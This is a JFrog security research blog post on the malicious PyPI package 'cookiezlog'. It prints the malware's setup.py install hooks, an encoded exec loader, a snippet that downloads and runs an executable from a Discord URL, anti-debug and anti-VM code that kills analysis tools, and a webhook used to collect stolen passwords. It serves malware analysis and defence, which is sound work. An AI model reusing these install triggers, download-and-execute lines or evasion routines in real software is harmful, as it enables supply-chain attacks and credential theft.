<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://jfrog.com/blog/pypi-malware-creators-are-starting-to-employ-anti-debug-techniques/">Original</a>
    <h1>Python Malware Starting to Employ Anti-Debug Techniques</h1>
    
    <div id="readability-page-1" class="page"><div>
			<p><img src="https://media.jfrog.com/wp-content/uploads/2022/12/13155705/PyPI-malware-are-starting-to-employ-Anti-Debug-techniques-863x300-1.png" alt="PyPI malware are starting to employ Anti-Debug techniques" width="863" height="300"/></p>
<p>The <a href="http://research.jfrog.com">JFrog Security Research</a> team continuously monitors popular open-source software (OSS) repositories with our <a href="http://jfrog.com/xray">automated tooling</a>, and reports any vulnerabilities or malicious packages discovered to repository maintainers and the wider community.</p>
<p>Most PyPI malware today tries to avoid static detection using various techniques: starting from primitive variable mangling to sophisticated code flattening and steganography techniques. Use of these techniques makes the package extremely suspicious, but it does prevent novice researchers from understanding the exact operation of the malware using static analysis tools. However – any dynamic analysis tool, such as a malware sandbox, quickly removes the malware’s static protection layers and reveals the underlying logic.</p>
<p>Recently, it seems that attackers have stepped up a notch – we’ve recently detected and disclosed the <strong>cookiezlog</strong> package which seemed to employ <strong>Anti-debugging code</strong> (designed to thwart dynamic analysis tools) in addition to regular obfuscation tools and techniques. <strong>This is the first time our research team (or any publication) have spotted these kinds of defenses in PyPI malware.</strong></p>
<p>In this post, we will give an overview of the techniques used in this Python malware and how to unpack similar malware.</p>
<h2>Installation triggers</h2>
<p>Similar to most malicious packages, the <strong>cookiezlog</strong> package runs immediately upon installation. This is achieved via “develop” and “install” triggers in setup.py –</p>
<pre><code>class PostDevelopCommand(develop):
    def run(self):
        execute()
        install.run(self)
 
 
class PostInstallCommand(install):
    def run(self):
        execute()
        install.run(self)
 
...
 
setup(
    name=&#39;cookiezlog&#39;,
    version=&#39;0.0.1&#39;,
    description=&#39;Extra Package for Roblox grabbing&#39;,
    ...
    cmdclass={
        &#39;develop&#39;: PostDevelopCommand,
        &#39;install&#39;: PostInstallCommand,
    },
)</code></pre>
<h2>Static Obfuscation Part 1 – The trivial stuff</h2>
<p>The first and simplest layer of protection is zlib-encoded code, which is executed immediately after the package is installed –</p>
<pre><code>def execute():
   import marshal,zlib;exec(marshal.loads(zlib.decompress(b&#39;x\x9cM\x90\xc1J\xc3@\x10\x86\xeb\xb5O\xb1\xec)\x01\xd9\xdd4I\x93\x08=\x84\xe0A\xa8(\xa1\x1e&lt;\x85\x98\x0c6hv\xd7...&#39;)))</code></pre>
<p>The decoded payload downloads a file from a hardcoded URL and executes it on the victim’s machine –</p>
<pre><code>URL = &#34;https://cdn.discordapp.com/attachments/1037723441480089600/1039359352957587516/Cleaner.exe&#34;
response = requests.get(URL)
open(&#34;Cleaner.exe&#34;, &#34;wb&#34;).write(response.content)
os.system(&#34;set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe&#34;)</code></pre>
<p>The executable is a Windows PE file. Looking at the strings in the executable, we can see that it’s not actual native code but rather a Python script packed into the PE format –</p>
<pre><code>$ strings Cleaner.exe | grep &#39;PyIns&#39;
Cannot open PyInstaller archive from executable (%s) or external archive (%s)
PyInstaller: FormatMessageW failed.
PyInstaller: pyi_win32_utils_to_utf8 failed.</code></pre>
<p>It can be quickly unpacked with the open-source tool <a href="https://github.com/extremecoders-re/pyinstxtractor">PyInstaller Extractor</a>.</p>
<p>The extracted code contains a lot of files, primarily third-party libraries. The most interesting extracted file is <strong>main.pyc</strong>, which contains the malware code as Python bytecode.</p>
<h2>Static Obfuscation Part 2 – Unpacking PyArmor</h2>
<p>Normally, we would be able to decompile the bytecode in <strong>main.pyc</strong> to Python source code, using tools such as <a href="https://pypi.org/project/uncompyle6/">uncompyle6</a>. However, in this case, another run of strings on <strong>main.pyc</strong> shows that the binary has been obfuscated with <a href="https://github.com/dashingsoft/pyarmor">PyArmor</a>:</p>
<pre><code>pytransformr
__pyarmor__
Dist\obf\main.py</code></pre>
<p>PyArmor is a commercial packer and obfuscator, which applies obfuscation techniques to the original code, encrypts it and protects it from analysis. Fortunately for the researchers, PyArmor keeps much of the information that’s necessary for introspection. Knowing this, we can try to restore the names of the functions and constants used in the original code.</p>
<p>Although PyArmor does not have any publicly-available unpacker, it can be fully unpacked with some manual effort. In this case, we chose to perform a quick unpacking shortcut (by using library injection) since we were mostly interested in the original symbols and strings.</p>
<p>Trying to run the packed module as a standalone script produces an error, specifying that the system doesn’t have the required module –</p>
<pre><code>$ python.exe .\main.pyc
Traceback (most recent call last):
  File &#34;&lt;dist\obf\main.py&gt;&#34;, line 3, in 
  File &#34;&#34;, line 1, in 
ModuleNotFoundError: No module named &#39;psutil&#39;</code></pre>
<p>Because the module looks for the psutil module, we can create a module with the same name somewhere in the PYTHONPATH and it will be executed in the context of the process. This can be used as an easy entry point for injecting our own code into the process. We created our own file named psutil.py in the same directory as the protected file (main.pyc) with the following code –</p>
<pre><code>import inspect
for frame in inspect.stack():
   for c in frame.frame.f_code.co_consts:
       if not inspect.iscode(c):
           continue
       dis.show_code(c)</code></pre>
<p>The snippet uses the <strong>inspect</strong> module, which allows to get a runtime information about the code being executed: it iterates over execution frames and extracts the names of the code blocks and referenced constants.</p>
<p>After running our snippet, it returned a list of strings that allowed us to discern the capabilities and origin of the malicious code. The most interesting strings were the URL of an injection module, pointing to the possible attacker’s repository, and references to anti-VM functionalities in the code:</p>
<pre><code>Injector
app-(\d*\.\d*)*) https://raw.githubusercontent.com/Syntheticc/injection1/main/injection.js
%WEBHOOK%
%IP%
index.js
check_vm None
VMwareService.exe
VMwareTray.exe</code></pre>
<h2>Anti-Debug Techniques</h2>
<p>The <a href="https://github.com/Syntheticc">Syntheticc GitHub profile</a> mentioned in the strings was still available at the time of writing. The profile’s repositories contain a bunch of open-source hacking tools. Among others there was a repository called “Advanced Anti Debug”, containing methods that could be used to prevent analysis of the malware –</p>
<p><img loading="lazy" src="https://media.jfrog.com/wp-content/uploads/2022/12/13155816/1_Syntheticc-GitHub-profile.png" alt="Syntheticc GitHub profile" width="1025" height="655"/></p>
<p>We can split the dynamic methods the malware used into two categories: Anti-Debug and Anti-VM.</p>
<p>The Anti-Debug checks look for suspicious system activity related to any debuggers or disassemblers and includes the following functions:</p>
<p><strong>check_processes</strong> looks whether debugger process runs on the system – comparing the active process list to the list of over 50 known tools, including –</p>
<ul>
<li>“idau64.exe” (<a href="https://hex-rays.com/ida-pro/">IDA Pro Disassembler</a>)</li>
<li>“x64dbg.exe” (<a href="https://x64dbg.com/">x64dbg Debugger</a>)</li>
<li>“Windbg.exe” (<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg Debugger</a>)</li>
<li>“Devenv.exe” (<a href="https://visualstudio.microsoft.com/">Visual Studio IDE</a>)</li>
<li>“Processhacker.exe” (<a href="https://processhacker.sourceforge.io/">Process Hacker</a>)</li>
</ul>
<pre><code>PROCNAMES = [
    &#34;ProcessHacker.exe&#34;,
    &#34;httpdebuggerui.exe&#34;,
    &#34;wireshark.exe&#34;,
    &#34;fiddler.exe&#34;,
    &#34;regedit.exe&#34;,
...
]
 
for proc in psutil.process_iter():
    if proc.name() in PROCNAMES:
        proc.kill()
</code></pre>
<p><strong>check_research_tools</strong> has almost the same functionality, comparing substrings of process names to a humble list of five traffic analysis tools –</p>
<ul>
<li>“wireshark” (<a href="https://www.wireshark.org/">Wireshark network protocol analyzer</a>)</li>
<li>“fiddler” (<a href="https://www.telerik.com/fiddler">Fiddler proxy</a>)</li>
<li>“http” (<a href="https://www.httpdebugger.com/screenshots.html">HTTP Debugger</a> and possibly more tools)</li>
<li>“traffic” (generic term)</li>
<li>“packet” (generic term)</li>
</ul>
<p>If any of these processes are found to be running, the Anti-Debug code tries to kill the process  via <a href="https://psutil.readthedocs.io/en/latest/index.html?highlight=terminate#psutil.Process.kill">psutil.Process.kill</a> – not a very subtle approach. Malware that is more stealth-conscious would just stop running without any indication, instead of interacting with external processes.</p>
<p>The other anti-debug techniques try to make sure the malware is not running inside a virtual machine –</p>
<p><strong>check_dll</strong> checks the system root directories for DLLs indicating that the system is running under a <a href="https://www.vmware.com/il/products/workstation-pro.html">VMWare</a> (“vmGuestLib.dll”) or <a href="https://www.virtualbox.org/">VirtualBox</a> (“vboxmrxnp.dll”) virtual machine guest.</p>
<p><strong>check_vm</strong> checks if any VMware-related processes are running, specifically VMwareService.exe or VMwareTray.exe.</p>
<p><strong>check_registry</strong> looks for keys used by virtual machines, for example a <a href="https://evasions.checkpoint.com/techniques/registry.html">well-known</a> registry key that gets added when VMWare drivers are installed – <strong>HKEY_LOCAL_MACHINE\SYSTEM\</strong></p>
<p><strong>ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc</strong></p>
<pre><code>def check_registry():
    if system(&#34;REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2&gt; nul&#34;) != 1 and system(&#34;REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2&gt; nul&#34;) != 1:exit_program(&#39;Detected Vm&#39;)
    handle = OpenKey(HKEY_LOCAL_MACHINE, &#39;SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum&#39;)
    try:
        if &#34;VMware&#34; in QueryValueEx(handle, &#39;0&#39;)[0] or &#34;VBOX&#34; in QueryValueEx(handle, &#39;0&#39;)[0]: exit_program(&#39;Detected Vm&#39;)
    finally: CloseKey(handle)</code></pre>
<p>Last but not least, the <strong>check_specs</strong> function analyzes the current machine usage –</p>
<pre><code>def check_specs():
    if int(str(virtual_memory()[0]/1024/1024/1024).split(&#34;.&#34;)[0]) &lt;= 4: exit_program(&#39;Memory Ammount Invalid&#39;)
    if int(str(disk_usage(&#39;/&#39;)[0]/1024/1024/1024).split(&#34;.&#34;)[0]) &lt;= 50: exit_program(&#39;Storage Ammount Invalid&#39;)
    if int(cpu_count()) &lt;= 1: exit_program(&#39;Cpu Counts Invalid&#39;)</code></pre>
<p>If there is a small amount of memory, disk space or only one CPU, it assumes that the process is running inside a virtual machine.</p>
<p>All of the checks mentioned above are relatively simple, but with the respectable protection against static analysis the malware already employed, it offers adequate protection against novice researchers – especially ones who only use automated analysis tools which wouldn’t be able to breach the defenses of this specific malware.</p>
<h2>The Payload – Simple Password Grabber</h2>
<p>The payload is disappointingly simple compared to the amount of defenses used by the malware, but it is still harmful. The payload is a password grabber, which gathers “autocomplete” passwords saved in the data caches of popular browsers and sends them to the C2 server (in this case a Discord hook – <strong>https[://]discord[.]com/api/webhooks/1039353898445582376/cvrsu8CslmIYzNyXMpkjbkNEy_O0yjg08x5R_a7mPdgooQquALPINn1YfD5CuJ11dM7h)</strong>.</p>
<p>From the strings extracted from the malware we can deduce that in addition to the “industry standard” Discord token leaker functionality, the payload also hunts for passwords of several <strong>financial services</strong> as can be seen by strings used by the <strong>send_info</strong> function –</p>
<pre><code>Name: send_info
Filename: 
Argument count: 0
...
Constants:
0: None
1: &#39;USERPROFILE&#39;
...
5: &#39;coinbase&#39;
...
7: &#39;binance&#39;
...
9: &#39;paypal&#39;
...</code></pre>
<h2>Summary</h2>
<p>We can once again see that malware developers constantly evolve their arsenal, adding new methods of evasion, and new layers of protection against analysis of their tools. Just a couple of years ago, the only tools that PyPI malware authors used were simple payload encoders. Today we see that malware that’s uploaded to OSS repositories is becoming more complex, has a few levels of static and dynamic protection and utilize combinations of commercial and homebrew tools. This is similar to their “colleagues” in the world of native malware and as such we are expecting OSS-repo malware to continue to evolve, perhaps with advanced techniques such as custom polymorphic encoding and deeper anti-debug methods.</p>
<h2>Stay up-to-date with JFrog Security Research</h2>
<p>Follow the latest discoveries and technical updates from the JFrog Security Research team in our <a href="https://jfrog.com/blog/tag/security-research/">security research blog posts</a> and on Twitter at <a href="https://twitter.com/JFrogSecurity">@JFrogSecurity</a>.</p>
        </div></div>
  </body>
</html>
